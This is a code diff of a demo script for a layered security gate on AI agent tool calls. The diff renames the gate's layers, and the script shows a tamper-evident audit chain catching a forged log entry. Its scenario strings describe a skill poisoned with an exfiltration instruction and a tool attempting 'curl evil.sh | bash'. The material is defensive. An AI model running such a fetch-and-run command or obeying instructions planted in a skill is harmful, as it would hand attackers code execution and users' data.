@@ -6,11 +6,11 @@
  * record of every layer's decision — and if anyone edits the on-disk log to hide
  * what happened, verification breaks and points at the exact entry.
  *
- * No new mechanism: it's warden's shipped audit chain (which keeper also reuses for
- * secret access), wired across the composed canon -> warden -> keeper gate.
+ * No new mechanism: it's redstamp's shipped audit chain (which strongroom also reuses for
+ * secret access), wired across the composed truecopy -> redstamp -> strongroom gate.
  */
 import fs from 'node:fs';
-import { runTrilogy, verifyAuditFile, forgeEntry, findEntry, keeperAudit } from '../audit-trail.mjs';
+import { runTrilogy, verifyAuditFile, forgeEntry, findEntry, strongroomAudit } from '../audit-trail.mjs';
 
 const L = (s = '') => console.log(s);
 const pad = (s, n) => (s + ' '.repeat(n)).slice(0, n);
@@ -22,14 +22,14 @@ L('─'.repeat(72));
 const { audit, results, trailPath } = runTrilogy();
 
 L('\nThe gate ran four calls. Each consulted layer recorded its decision:\n');
-const verdict = { proceed: 'allowed', canon: 'STOPPED by canon', warden: 'STOPPED by warden', keeper: 'STOPPED by keeper' };
+const verdict = { proceed: 'allowed', truecopy: 'STOPPED by truecopy', redstamp: 'STOPPED by redstamp', strongroom: 'STOPPED by strongroom' };
 const scenario = {
   proceed: 'vetted tool · safe GET · valid lease',
-  canon:   'POISONED tool (exfil instruction in its skill)',
-  warden:  'vetted tool tries  curl evil.sh | bash',
-  keeper:  'vetted tool · safe call · lease already spent',
+  truecopy:   'POISONED tool (exfil instruction in its skill)',
+  redstamp:  'vetted tool tries  curl evil.sh | bash',
+  strongroom:  'vetted tool · safe call · lease already spent',
 };
-for (const k of ['proceed', 'canon', 'warden', 'keeper']) {
+for (const k of ['proceed', 'truecopy', 'redstamp', 'strongroom']) {
   L('  ' + pad(scenario[k], 48) + '→ ' + verdict[k]);
 }
 
@@ -49,22 +49,22 @@ const ok = verifyAuditFile(trailPath);
 L('\n  verifyAuditFile() → ' + JSON.stringify(ok) + '   ✅ INTACT — every link checks out');
 
 // Now an attacker who can write the log tries to HIDE the poisoned-tool block:
-// rewrite canon's "block" entry to look like a "pass". The record changes; its
+// rewrite truecopy's "block" entry to look like a "pass". The record changes; its
 // stored hash does not — so the recomputed seal no longer matches.
-const tamperAt = findEntry(trailPath, (e) => e.layer === 'canon' && e.decision === 'block');
-L('\nAttacker rewrites entry #' + tamperAt + " (canon's block on the poisoned tool) to read 'pass'…");
+const tamperAt = findEntry(trailPath, (e) => e.layer === 'truecopy' && e.decision === 'block');
+L('\nAttacker rewrites entry #' + tamperAt + " (truecopy's block on the poisoned tool) to read 'pass'…");
 forgeEntry(trailPath, tamperAt, { decision: 'pass', verdict: 'clean' });
 
 const broken = verifyAuditFile(trailPath);
 L('  verifyAuditFile() → ' + JSON.stringify(broken) + '   ❌ BROKEN — tamper detected at entry #' + broken.at);
 L('\n  The edit is silent in the file but LOUD in the chain: you cannot rewrite history');
-L('  without breaking the seal. (keeper protects its own secret-access log the same way,');
-L('  with an additional HMAC tip — keeperAudit.verify(): ' + JSON.stringify(keeperAudit.verify()) + ')');
+L('  without breaking the seal. (strongroom protects its own secret-access log the same way,');
+L('  with an additional HMAC tip — strongroomAudit.verify(): ' + JSON.stringify(strongroomAudit.verify()) + ')');
 
 L('\nvet it · contain it · key it never holds · and PROVE every decision ✅\n');
 
 // Make the demo self-checking: it must have actually demonstrated intact→broken.
-if (!(results.proceed.ok && results.canon.by === 'canon' && results.warden.by === 'warden' && results.keeper.by === 'keeper')) {
+if (!(results.proceed.ok && results.truecopy.by === 'truecopy' && results.redstamp.by === 'redstamp' && results.strongroom.by === 'strongroom')) {
   console.error('demo precondition failed: the four beats did not produce the expected verdicts');
   process.exit(1);
 }
